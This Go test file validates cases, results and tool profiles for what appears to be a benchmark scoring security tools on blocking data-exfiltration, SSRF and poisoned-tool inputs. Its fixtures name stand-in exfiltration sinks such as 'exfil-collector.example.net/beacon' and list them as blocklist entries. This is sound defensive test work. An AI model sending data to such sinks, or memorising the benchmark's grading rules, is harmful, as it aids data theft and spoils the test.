	assertContainsError(t, validateProfileFile(path), "incompatible_schema_version: family=tool_profile accepted=[4] got=3")
	contract := toolProfileReaderContract(t, "validator_scoring")
	if contract.Role != "scoring" || contract.Path != "validate/main.go" || !reflect.DeepEqual(contract.AcceptedVersions, []int{activeToolProfileSchemaVersion}) {
		t.Fatalf("validator reader contract = %#v, want scoring validate/main.go v%d", contract, activeToolProfileSchemaVersion)
	}
}

func TestResultValidation_MissingFields(t *testing.T) {
	r := ResultLine{} // all empty
	errors := validateResultLine(1, r)
	if len(errors) < 3 {
		t.Fatalf("expected multiple errors for empty result line, got %d", len(errors))
	}
}

func TestResultValidation_InconsistentScore(t *testing.T) {
	tests := []struct {
		name     string
		actual   string
		expected string
		score    string
		wantErr  bool
	}{
		{"match should be pass", "block", "block", "pass", false},
		{"match but fail", "block", "block", "fail", true},
		{"match but budget timing fail", "block", "block", "fail", false},
		{"match but bare timing no budget id", "block", "block", "fail", true},
		{"unreachable verdict error score", "unreachable", "block", "error", false},
		{"unreachable verdict wrong score", "unreachable", "block", "pass", true},
		{"error verdict error score", "error", "block", "error", false},
		{"error verdict wrong score", "error", "block", "pass", true},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			r := ResultLine{
				SchemaVersion: 4, CaseID: "t", Tool: "t", ToolVersion: "1",
				CapabilityRegistry: testRegistryReference,
				ExpectedVerdict:    tt.expected, ActualVerdict: tt.actual, Score: tt.score,
				Evidence: map[string]interface{}{}, Notes: strPtr(""),
			}
			if strings.Contains(tt.name, "budget timing") {
				// A genuine budget-enforcement result carries over_budget_call_id
				// alongside before-over-budget timing.
				r.Evidence["budget_block_timing"] = "before_over_budget"
				r.Evidence["over_budget_call_id"] = float64(4)
			}
			if strings.Contains(tt.name, "bare timing") {
				// Timing evidence without the budget id must NOT bypass the
				// matching-verdict-must-pass rule.
				r.Evidence["budget_block_timing"] = "before_over_budget"
			}
			errors := validateResultLine(1, r)
			hasErr := len(errors) > 0
			if hasErr != tt.wantErr {
				t.Errorf("wantErr=%v but got errors: %v", tt.wantErr, errors)
			}
		})
	}
}

func TestResultValidation_DuplicateCaseId(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "results.jsonl")
	lines := `{"schema_version": 4,"case_id":"a","tool":"t","tool_version":"1","expected_verdict":"block","actual_verdict":"block","score":"pass","evidence":{},"notes":""}
{"schema_version": 4,"case_id":"a","tool":"t","tool_version":"1","expected_verdict":"block","actual_verdict":"allow","score":"fail","evidence":{},"notes":""}`
	if err := os.WriteFile(path, []byte(lines), 0o600); err != nil {
		t.Fatal(err)
	}

	errors := validateResultsFile(path)
	found := false
	for _, e := range errors {
		if strings.Contains(e, "duplicate case_id") {
			found = true
		}
	}
	if !found {
		t.Fatal("expected duplicate case_id error")
	}
}

func TestResultValidation_EmptyFile(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "empty.jsonl")
	if err := os.WriteFile(path, []byte(""), 0o600); err != nil {
		t.Fatal(err)
	}

	errors := validateResultsFile(path)
	if len(errors) == 0 {
		t.Fatal("expected error for empty file")
	}
}

// --- Profile validation tests ---

func TestProfileValidation_Valid(t *testing.T) {
	p := Profile{
		SchemaVersion: 4, Tool: "test", ToolVersion: "1.0", RunnerVersion: "v1",
		Claims: []string{"url_dlp", "ssrf"}, CapabilityRegistry: testRegistryReference,
	}
	errors := validateProfile(p)
	if len(errors) != 0 {
		t.Fatalf("expected no errors, got: %v", errors)
	}
}

func TestProfileValidation_DefersClaimVocabularyToSnapshot(t *testing.T) {
	p := Profile{
		SchemaVersion: 4, Tool: "test", ToolVersion: "1.0", RunnerVersion: "v1",
		Claims: []string{"url_dlp", "not_a_real_claim"}, CapabilityRegistry: testRegistryReference,
	}
	errors := validateProfile(p)
	if len(errors) != 0 {
		t.Fatalf("profile structural validation should defer labels to pinned snapshot: %v", errors)
	}
}

func TestProfileValidation_MissingFields(t *testing.T) {
	p := Profile{} // all empty/zero
	errors := validateProfile(p)
	if len(errors) < 4 {
		t.Fatalf("expected multiple errors for empty profile, got %d: %v", len(errors), errors)
	}
}

func TestProfileValidation_File(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "profile.json")
	data, err := json.Marshal(Profile{
		SchemaVersion: 4,
		Tool:          "test", ToolVersion: "1.0", RunnerVersion: "v1", Claims: []string{"url_dlp"}, CapabilityRegistry: testRegistryReference,
	})
	if err != nil {
		t.Fatal(err)
	}
	_ = os.WriteFile(path, data, 0o600)

	// The profile has no sibling registry, so the active file reader must fail
	// closed rather than silently accepting an unresolved claim.
	assertContainsError(t, validateProfileFile(path), "capability registry not found")
}

// --- Regression tests for unknown fields and missing required fields ---

func TestCaseValidation_RejectsUnknownFields(t *testing.T) {
	dir := t.TempDir()
	writeCase(t, dir, "url", "url-extra-001.json", `{
		"schema_version": 4, "id": "url-extra-001", "category": "url",
		"title": "T", "description": "D", "input_type": "url",
		"transport": "fetch_proxy",
		"payload": {"method": "GET", "url": "https://example.com"},
		"expected_verdict": "block", "severity": "high",
		"capability_tags": ["url_dlp"], "requires": [],
		"false_positive_risk": "low", "why_expected": "test",
		"notes": "", "source": "",
		"bogus_field": "should fail"
	}`)

	ids := make(map[string]string)
	path := filepath.Join(dir, "url", "url-extra-001.json")
	errors := validateFile(path, ids)
	assertContainsError(t, errors, "unknown field")
}

func TestResultValidation_RejectsUnknownFields(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "results.jsonl")
	line := `{"case_id":"t","tool":"t","tool_version":"1","expected_verdict":"block","actual_verdict":"block","score":"pass","evidence":{},"notes":"","extra":"bad"}`
	_ = os.WriteFile(path, []byte(line+"\n"), 0o600)

	errors := validateResultsFile(path)
	assertContainsError(t, errors, "unknown field")
}

func TestResultValidation_MissingNotes(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "results.jsonl")
	line := `{"case_id":"t","tool":"t","tool_version":"1","expected_verdict":"block","actual_verdict":"block","score":"pass","evidence":{}}`
	_ = os.WriteFile(path, []byte(line+"\n"), 0o600)

	errors := validateResultsFile(path)
	assertContainsError(t, errors, "missing notes")
}

func TestResultValidation_BlankOnlyFile(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "blank.jsonl")
	_ = os.WriteFile(path, []byte("\n\n\n"), 0o600)

	errors := validateResultsFile(path)
	assertContainsError(t, errors, "no result lines")
}

func TestProfileValidation_RejectsUnknownFields(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "profile.json")
	raw := map[string]interface{}{
		"schema_version":      4,
		"tool":                "test",
		"tool_version":        "1.0",
		"runner_version":      "v1",
		"claims":              []string{"url_dlp"},
		"capability_registry": map[string]interface{}{"id": "aeb.core-capabilities", "format": 1, "revision": 1, "sha256": testRegistryReference.SHA256},
		"bogus":               true,
	}
	data, err := json.Marshal(raw)
	if err != nil {
		t.Fatal(err)
	}
	_ = os.WriteFile(path, data, 0o600)

	errors := validateProfileFile(path)
	assertContainsError(t, errors, "unknown field")
}

// caseWithRequires renders a minimal valid single-file case carrying the given
// requires array, so a test can vary requires and nothing else.
func caseWithRequires(requires string) string {
	return fmt.Sprintf(`{
		"schema_version": 4,
		"id": "url-test-001",
		"category": "url",
		"title": "Test URL case",
		"description": "Valid URL test case",
		"input_type": "url",
		"transport": "fetch_proxy",
		"payload": {"method": "GET", "url": "https://example.com/test"},
		"expected_verdict": "block",
		"severity": "high",
		"capability_tags": ["url_dlp"],
		"requires": %s,
		"false_positive_risk": "low",
		"why_expected": "test_reason",
		"notes": "",
		"source": ""
	}`, requires)
}

func caseWithPayloadAndPrereqs(payloadURL, requires, prereqs string) string {
	return fmt.Sprintf(`{
		"schema_version": 4,
		"id": "url-test-001",
		"category": "url",
		"title": "Test URL case",
		"description": "Valid URL test case",
		"input_type": "url",
		"transport": "fetch_proxy",
		"payload": {"method": "GET", "url": %q},
		"expected_verdict": "block",
		"severity": "high",
		"capability_tags": ["domain_blocklist"],
		"requires": %s,
		"prerequisites": %s,
		"false_positive_risk": "low",
		"why_expected": "test_reason",
		"notes": "",
		"source": ""
	}`, payloadURL, requires, prereqs)
}

func wsCaseWithPrereqs(payloadURL, requires, prereqs string) string {
	prereqField := ""
	if prereqs != "[]" {
		prereqField = fmt.Sprintf(`"prerequisites": %s,`, prereqs)
	}
	return fmt.Sprintf(`{
		"schema_version": 4,
		"id": "ws-dlp-test-001",
		"category": "websocket_dlp",
		"title": "Test WS case",
		"description": "Valid WS test case",
		"input_type": "websocket_frame",
		"transport": "websocket",
		"payload": {"url": %q, "frames": [{"opcode": "text", "payload": "x"}]},
		"expected_verdict": "block",
		"severity": "high",
		"capability_tags": ["websocket_dlp"],
		"requires": %s,
		%s
		"false_positive_risk": "low",
		"why_expected": "test_reason",
		"notes": "",
		"source": "synthetic: validator test"
	}`, payloadURL, requires, prereqField)
}

func a2aCaseWithPrereqs(targetURL, requires, prereqs string) string {
	prereqField := ""
	if prereqs != "[]" {
		prereqField = fmt.Sprintf(`"prerequisites": %s,`, prereqs)
	}
	return fmt.Sprintf(`{
		"schema_version": 4,
		"id": "a2a-msg-test-001",
		"category": "a2a_message",
		"title": "Test A2A case",
		"description": "Valid A2A test case",
		"input_type": "a2a_message",
		"transport": "a2a",
		"payload": {"target_url": %q, "jsonrpc_messages": [{"jsonrpc": "2.0", "id": "req-1", "method": "message/send"}]},
		"expected_verdict": "block",
		"severity": "high",
		"capability_tags": ["a2a_scan"],
		"requires": %s,
		%s
		"false_positive_risk": "low",
		"why_expected": "test_reason",
		"notes": "",
		"source": "synthetic: validator test"
	}`, targetURL, requires, prereqField)
}

// Attack-difficulty flags describe how hard an input is on a surface the tool
// already inspects. Letting one gate applicability would let a tool dodge the
// hard variant by declining the claim, so requires must reject them on every
// case shape. This test covers the single-file JSON shape.
func TestRequiresRejectsDifficultyFlags(t *testing.T) {
	for _, flag := range []string{"encoding_evasion_scanning", "ssrf_bypass_scanning"} {
		t.Run(flag, func(t *testing.T) {
			dir := t.TempDir()
			path := writeCase(t, dir, "url", "url-test-001.json",
				caseWithRequires(fmt.Sprintf(`["%s"]`, flag)))

			errors := validateFile(path, make(map[string]string))
			assertContainsError(t, errors, "attack-difficulty flag")
		})
	}
}

// Enforcement claims name the feature under test. Gating on one lets a tool
// delete both the attack cases and the benign control that measures its
// over-blocking, which is what budget_enforcement did to the denial-of-wallet
// family. Rejecting the token closes the class, not just the instance the
// corpus happened to contain.
func TestRequiresRejectsEnforcementClaims(t *testing.T) {
	dir := t.TempDir()
	path := writeCase(t, dir, "url", "url-test-001.json",
		caseWithRequires(`["budget_enforcement"]`))

	errors := validateFile(path, make(map[string]string))
	assertContainsError(t, errors, "enforcement claim")
}

func TestBlocklistPrerequisiteMustMatchPayloadHost(t *testing.T) {
	dir := t.TempDir()
	matching := writeCase(t, dir, "url", "url-test-001.json", caseWithPayloadAndPrereqs(
		"https://exfil-collector.example.net/beacon",
		`["domain_blocklist"]`,
		`[{"kind":"blocklist_domain","value":"exfil-collector.example.net"}]`,
	))
	if errors := validateFile(matching, make(map[string]string)); len(errors) > 0 {
		t.Fatalf("matching blocklist_domain should pass, got: %v", errors)
	}

	unrelated := writeCase(t, dir, "url", "url-test-002.json", strings.ReplaceAll(
		caseWithPayloadAndPrereqs(
			"https://exfil-collector.example.net/beacon",
			`["domain_blocklist"]`,
			`[{"kind":"blocklist_domain","value":"totally-unrelated.example.org"}]`,
		),
		`"id": "url-test-001"`,
		`"id": "url-test-002"`,
	))
	errors := validateFile(unrelated, make(map[string]string))
	assertContainsError(t, errors, "does not match any payload host")
}

func TestReservedSinkPrerequisiteMustMatchPayloadHost(t *testing.T) {
	dir := t.TempDir()
	matching := writeCase(t, dir, "websocket-dlp", "ws-dlp-test-001.json", wsCaseWithPrereqs(
		"wss://ws-exfil-sink.test/live",
		`["entropy_scanning"]`,
		`[{"kind":"reserved_sink_route","value":"ws-exfil-sink.test"}]`,
	))
	if errors := validateFile(matching, make(map[string]string)); len(errors) > 0 {
		t.Fatalf("matching reserved_sink_route should pass, got: %v", errors)
	}

	unrelatedJSON := strings.ReplaceAll(
		wsCaseWithPrereqs(
			"wss://ws-exfil-sink.test/live",
			`["entropy_scanning"]`,
			`[{"kind":"reserved_sink_route","value":"totally-unrelated.example.org"}]`,
		),
		`"id": "ws-dlp-test-001"`,
		`"id": "ws-dlp-test-002"`,
	)
	unrelated := writeCase(t, dir, "websocket-dlp", "ws-dlp-test-002.json", unrelatedJSON)
	errors := validateFile(unrelated, make(map[string]string))
	assertContainsError(t, errors, "does not match any payload host")
}

// Declaring nothing is valid, because the runner derives the sink route from the
// payload host against a fixed reserved list. Demanding a declaration here would
// be unreachable for every case whose bytes are already fixed, which is exactly
// the set of cases this guard exists to protect.
func TestReservedSinkPayloadNeedsNoDeclaredRoute(t *testing.T) {
	dir := t.TempDir()
	path := writeCase(t, dir, "a2a-message", "a2a-msg-test-001.json", a2aCaseWithPrereqs(
		"http://a2a-exfil-sink.test/message:send",
		`["entropy_scanning"]`,
		`[]`,
	))
	if errors := validateFile(path, make(map[string]string)); len(errors) > 0 {
		t.Fatalf("undeclared reserved sink should pass and be derived, got: %v", errors)
	}
}

func TestCorpusPrerequisiteCasesValidate(t *testing.T) {
	ids := make(map[string]string)
	for _, path := range []string{
		"../cases/url/url-domain-blocklist-001.json",
		"../cases/websocket-dlp/ws-dlp-opaque-binary-010.json",
		"../cases/a2a-message/a2a-msg-opaque-entropy-013.json",
	} {
		if errors := validateFile(path, ids); len(errors) > 0 {
			t.Errorf("%s: %v", path, errors)
		}
	}
}

// A case requiring a blocklist need not declare the domain, because the runner
// derives it from the payload host. What it must have is a host to derive from:
// without one there is nothing for an operator to seed and the case would score
// a miss that is really missing setup.
func TestDomainBlocklistDerivesFromPayloadHost(t *testing.T) {
	dir := t.TempDir()
	derivable := writeCase(t, dir, "url", "url-test-001.json", caseWithPayloadAndPrereqs(
		"https://exfil-collector.example.net/beacon",
		`["domain_blocklist"]`,
		`[]`,
	))
	if errors := validateFile(derivable, make(map[string]string)); len(errors) > 0 {
		t.Fatalf("undeclared blocklist domain should pass and be derived, got: %v", errors)
	}

	hostless := writeCase(t, dir, "url", "url-test-002.json", strings.ReplaceAll(
		strings.ReplaceAll(
			caseWithPayloadAndPrereqs("https://exfil-collector.example.net/beacon", `["domain_blocklist"]`, `[]`),
			`"id": "url-test-001"`, `"id": "url-test-002"`,
		),
		`"url": "https://exfil-collector.example.net/beacon"`, `"url": "not-a-url"`,
	))
	errors := validateFile(hostless, make(map[string]string))
	assertContainsError(t, errors, "no url or target_url host to derive the domain from")
}

// Positive control for the test above: a legitimate runtime prerequisite in the
// same field must still pass, so the guard is proven to reject the flag rather
// than to reject requires in general.
func TestRequiresAcceptsRuntimePrerequisite(t *testing.T) {
	dir := t.TempDir()
	path := writeCase(t, dir, "url", "url-test-001.json",
		caseWithRequires(`["tls_interception"]`))

	if errors := validateFile(path, make(map[string]string)); len(errors) > 0 {
		t.Errorf("expected no errors for a valid requires entry, got: %v", errors)
	}
}

// The corpus walk must actually reach case.yaml files inside a multi-file case
// directory. Without this the guard above is correct but never invoked, which
// is the exact shape of a check that exists and checks nothing.
func TestRunCasesReachesMultiFileCases(t *testing.T) {
	// A valid single-file case must be present, otherwise runCases fails with
	// "no case files found" and the assertion below would pass for a reason
	// that has nothing to do with the multi-file walk.
	newCorpus := func(t *testing.T) string {
		t.Helper()
		dir := t.TempDir()
		writeCase(t, dir, "url", "url-test-001.json", caseWithRequires(`[]`))
		return dir
	}

	writeDriftCase := func(t *testing.T, dir, requires string) {
		t.Helper()
		caseDir := filepath.Join(dir, "mcp-drift", "mcp-drift-test-001")
		if err := os.MkdirAll(caseDir, 0o750); err != nil {
			t.Fatal(err)
		}
		yaml := fmt.Sprintf(`schema_version: 4
id: mcp-drift-test-001
category: mcp_drift
title: Test drift case
description: Test temporal MCP case
threat_model: Test-only threat model
input_type: mcp_tool_sequence_temporal
transport: mcp_stdio
files:
  before: before.json
  after: after.json
  expected: expected.json
expected_verdict: block
severity: high
capability_tags: [mcp_tool_poison]
requires: [%s]
false_positive_risk: low
why_expected: test_temporal_change
notes: notes.md
source: "synthetic: validator test"
`, requires)
		if err := os.WriteFile(filepath.Join(caseDir, "case.yaml"), []byte(yaml), 0o600); err != nil {
			t.Fatal(err)
		}
		snapshot := `{"jsonrpc":"2.0","id":1,"result":{"tools":[{"name":"test_tool","inputSchema":{}}]}}`
		for _, name := range []string{"before.json", "after.json"} {
			if err := os.WriteFile(filepath.Join(caseDir, name), []byte(snapshot), 0o600); err != nil {
				t.Fatal(err)
			}
		}
		expected := `{"version":1,"action_record":{"version":1,"verdict":"block","transport":"mcp_stdio","severity":"high","layer":"mcp_tool_baseline","pattern":"test","intent":"test"}}`
		if err := os.WriteFile(filepath.Join(caseDir, "expected.json"), []byte(expected), 0o600); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(filepath.Join(caseDir, "notes.md"), []byte("# Test case\n"), 0o600); err != nil {
			t.Fatal(err)
		}
	}

	// Control: the same corpus without a multi-file offender must pass, proving
	// the failure below comes from the case.yaml and not from the corpus shape.
	t.Run("clean corpus passes", func(t *testing.T) {
		dir := newCorpus(t)
		writeDriftCase(t, dir, "mcp_tool_baseline")
		if code := runCases(dir); code != 0 {
			t.Errorf("expected a clean corpus to pass, got exit %d", code)
		}
	})

	t.Run("difficulty flag in a multi-file case fails the run", func(t *testing.T) {
		dir := newCorpus(t)
		writeDriftCase(t, dir, "encoding_evasion_scanning")
		if code := runCases(dir); code == 0 {
			t.Error("expected runCases to fail on a multi-file case carrying a difficulty flag, got exit 0")
		}
	})

	// The runner's loader treats a case directory with no case.yaml as a hard
	// error (see TestLoadMultiFileCases_MissingCaseYAML). This walk globbed for
	// */case.yaml, so such a directory matched nothing and was silently ignored:
	// a corpus the scorer refuses to load validated clean here. The sibling
	// "clean corpus passes" subtest above is the control proving this corpus
	// shape exits 0 without the partial directory.
	t.Run("multi-file case directory without case.yaml fails the run", func(t *testing.T) {
		dir := newCorpus(t)
		writeDriftCase(t, dir, "mcp_tool_baseline")
		if err := os.MkdirAll(filepath.Join(dir, "mcp-drift", "mcp-drift-partial-001"), 0o750); err != nil {
			t.Fatal(err)
		}
		if code := runCases(dir); code == 0 {
			t.Error("expected runCases to fail on a multi-file case directory with no case.yaml, got exit 0")
		}
	})
}

// A payload naming two endpoints must not let one satisfy a check the other
// escapes. The A2A adapter delivers to target_url, so binding to the first field
// let a seeded decoy url stand in for an unseeded real target.
func TestPrerequisiteMatchesEitherPayloadEndpoint(t *testing.T) {
	dir := t.TempDir()
	path := writeCase(t, dir, "a2a-message", "a2a-msg-test-001.json", a2aCaseWithPrereqs(
		"http://a2a-exfil-sink.test/message:send",
		`["entropy_scanning"]`,
		`[{"kind":"reserved_sink_route","value":"a2a-exfil-sink.test"}]`,
	))
	if errors := validateFile(path, make(map[string]string)); len(errors) > 0 {
		t.Fatalf("a target_url host should satisfy the binding, got: %v", errors)
	}
}

// reservedSinkHosts is a closed contract, so a value outside it must be refused.
// Accepting any host would let a case name an unroutable sink and convert a
// scoreable case into an unsatisfied-setup error no runner could clear.
func TestReservedSinkRouteRejectsHostsOutsideTheClosedSet(t *testing.T) {
	dir := t.TempDir()
	path := writeCase(t, dir, "websocket-dlp", "ws-dlp-test-003.json", wsCaseWithPrereqs(
		"wss://not-a-reserved-sink.test/live",
		`["entropy_scanning"]`,
		`[{"kind":"reserved_sink_route","value":"not-a-reserved-sink.test"}]`,
	))
	errors := validateFile(path, make(map[string]string))
	assertContainsError(t, errors, "is not a corpus-reserved sink host")
}

// A prerequisite that matches ANY payload host still leaves the other one
// unguarded. With url and target_url both present the transport selects one of
// them, so a decoy in the covered field passed validation while the endpoint
// the run actually delivers to carried no setup at all. Mirrors
// runner/prerequisites.go uncoveredEndpoint.
func TestEveryPayloadEndpointMustBeCovered(t *testing.T) {
	dir := t.TempDir()
	twoEndpoints := func(id, prereqs string) string {
		return fmt.Sprintf(`{
		"schema_version": 4,
		"id": %q,
		"category": "url",
		"title": "Test URL case",
		"description": "Valid URL test case",
		"input_type": "url",
		"transport": "fetch_proxy",
		"payload": {"method": "GET", "url": "https://a2a-exfil-sink.test/decoy", "target_url": "https://unseeded-real-target.example.net/message:send"},
		"expected_verdict": "block",
		"severity": "high",
		"capability_tags": ["domain_blocklist"],
		"requires": [],
		"prerequisites": %s,
		"false_positive_risk": "low",
		"why_expected": "test_reason",
		"notes": "",
		"source": ""
	}`, id, prereqs)
	}

	partial := writeCase(t, dir, "url", "url-cover-001.json", twoEndpoints(
		"url-cover-001",
		`[{"kind":"reserved_sink_route","value":"a2a-exfil-sink.test"}]`,
	))
	errors := validateFile(partial, make(map[string]string))
	assertContainsError(t, errors, "unseeded-real-target.example.net")

	complete := writeCase(t, dir, "url", "url-cover-002.json", twoEndpoints(
		"url-cover-002",
		`[{"kind":"reserved_sink_route","value":"a2a-exfil-sink.test"},{"kind":"blocklist_domain","value":"unseeded-real-target.example.net"}]`,
	))
	if errors := validateFile(complete, make(map[string]string)); len(errors) > 0 {
		t.Fatalf("covering every endpoint should pass, got: %v", errors)
	}

	// Covering nothing is not a claim about any destination, so completeness has
	// nothing to enforce. Refusing here would reject ordinary cases that need no
	// external setup, which is the availability direction of the same mistake.
	// Neither host may be a reserved sink: naming one IS coverage, derived rather
	// than declared, and that is the case the block above refuses.
	neutral := strings.ReplaceAll(
		twoEndpoints("url-cover-003", `[]`),
		"https://a2a-exfil-sink.test/decoy",
		"https://first.example.net/a",
	)
	none := writeCase(t, dir, "url", "url-cover-003.json", neutral)
	if errors := validateFile(none, make(map[string]string)); len(errors) > 0 {
		t.Fatalf("covering no endpoint should pass, got: %v", errors)
	}
}

// Both branches are new gates on case content with no test behind them, so a
// regression in either would have merged silently.
func TestPrerequisiteDuplicateAndUnknownKindAreRejected(t *testing.T) {
	dir := t.TempDir()

	duplicate := writeCase(t, dir, "url", "url-dup-001.json", strings.ReplaceAll(
		caseWithPayloadAndPrereqs(
			"https://exfil-collector.example.net/beacon",
			`["domain_blocklist"]`,
			`[{"kind":"blocklist_domain","value":"exfil-collector.example.net"},{"kind":"blocklist_domain","value":"exfil-collector.example.net"}]`,
		),
		`"id": "url-test-001"`,
		`"id": "url-dup-001"`,
	))
	assertContainsError(t, validateFile(duplicate, make(map[string]string)), "duplicate prerequisite at index 1")

	unknown := writeCase(t, dir, "url", "url-kind-001.json", strings.ReplaceAll(
		caseWithPayloadAndPrereqs(
			"https://exfil-collector.example.net/beacon",
			`["domain_blocklist"]`,
			`[{"kind":"seed_the_moon","value":"exfil-collector.example.net"}]`,
		),
		`"id": "url-test-001"`,
		`"id": "url-kind-001"`,
	))
	assertContainsError(t, validateFile(unknown, make(map[string]string)), "invalid prerequisite kind at index 0")
}

// The runner trims an endpoint before parsing it and the validator did not, so a
// leading-space endpoint yielded no host here and a real host at runtime. The
// case validated and then failed setup on a host validation never saw.
func TestPayloadHostExtractionTrimsLikeTheRunner(t *testing.T) {
	hosts := extractPayloadURLHosts(map[string]interface{}{
		"url": "  https://exfil-collector.example.net/beacon  ",
	})
	if len(hosts) != 1 || hosts[0] != "exfil-collector.example.net" {
		t.Fatalf("hosts = %v, want [exfil-collector.example.net]", hosts)
	}
}
